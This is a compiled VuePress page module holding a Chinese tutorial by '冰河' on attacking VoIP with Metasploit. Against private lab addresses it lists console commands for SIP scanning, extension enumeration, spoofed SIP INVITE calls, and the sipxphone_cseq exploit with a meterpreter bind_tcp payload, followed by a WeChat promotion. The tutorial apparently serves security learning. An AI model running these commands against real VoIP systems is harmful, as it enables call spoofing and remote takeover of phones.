@@ -1,0 +1,23 @@
+import{i as e,r as t,s as n,t as r}from"./app-BJaruqUz.js";var i=JSON.parse(`{"path":"/md/hack/tools/2022-04-17-039-Metasploit%E6%B8%97%E9%80%8FVOIP.html","title":"Metasploit渗透VOIP","lang":"zh-CN","frontmatter":{"category":"binghe-code-hack","title":"Metasploit渗透VOIP","tagline":"by 冰河","tag":["hack","binghe-code-hack"],"excerpt":"Metasploit渗透VOIP","lock":"need"},"git":{"updatedTime":1777440700000,"contributors":[{"name":"binghe001","username":"binghe001","email":"“1028386804@qq.com”","commits":1,"url":"https://github.com/binghe001"}],"changelog":[{"hash":"fd547ca49fe6afef55548f7a0aeaeb4eca279a4d","time":1777440700000,"email":"“1028386804@qq.com”","author":"binghe001","message":"feature: 升级到vuepress2"}]},"filePathRelative":"md/hack/tools/2022-04-17-039-Metasploit渗透VOIP.md"}`),a={name:`2022-04-17-039-Metasploit渗透VOIP.md`};function o(r,i,a,o,s,c){return n(),t(`div`,null,[...i[0]||=[e(`<h1 id="metasploit渗透voip" tabindex="-1"><a class="header-anchor" href="#metasploit渗透voip"><span>Metasploit渗透VOIP</span></a></h1><h2 id="对voip服务踩点" tabindex="-1"><a class="header-anchor" href="#对voip服务踩点"><span>对VOIP服务踩点</span></a></h2><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">use auxiliary/scanner/sip/options</span>
+<span class="line">show options</span>
+<span class="line">set RHOSTS 192.168.109.0/24</span>
+<span class="line">run</span>
+<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="扫描voip服务" tabindex="-1"><a class="header-anchor" href="#扫描voip服务"><span>扫描VOIP服务</span></a></h2><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">use auxiliary/scanner/sip/enumerator</span>
+<span class="line">show options</span>
+<span class="line">set MINEXT 3000</span>
+<span class="line">set MAXEXT 3005</span>
+<span class="line">set PADLEN 4</span>
+<span class="line">set RHOSTS 192.168.109.0/24</span>
+<span class="line">run</span>
+<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="欺骗voip电话" tabindex="-1"><a class="header-anchor" href="#欺骗voip电话"><span>欺骗VOIP电话</span></a></h2><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">use auxiliary/voip/sip_invite_spoof</span>
+<span class="line">set RHOSTS 192.168.109.141</span>
+<span class="line">set EXTENSION 4444</span>
+<span class="line">show options</span>
+<span class="line">run</span>
+<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="渗透voip" tabindex="-1"><a class="header-anchor" href="#渗透voip"><span>渗透VOIP</span></a></h2><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">use exploit/windows/sip/sipxphone_cseq</span>
+<span class="line">set RHOST 192.168.109.141</span>
+<span class="line">set payload windows/meterpreter/bind_tcp</span>
+<span class="line">set LHOST 192.168.109.137</span>
+<span class="line">show options</span>
+<span class="line">exploit</span>
+<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="写在最后" tabindex="-1"><a class="header-anchor" href="#写在最后"><span>写在最后</span></a></h2><blockquote><p>如果你觉得冰河写的还不错，请微信搜索并关注「 <strong>冰河技术</strong> 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 <strong>冰河技术</strong> 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 <strong>冰河技术</strong> 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 <strong>冰河技术</strong> 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200906013715889.png" alt=""></p>`,12)]])}var s=r(a,[[`render`,o]]);export{i as _pageData,s as default};
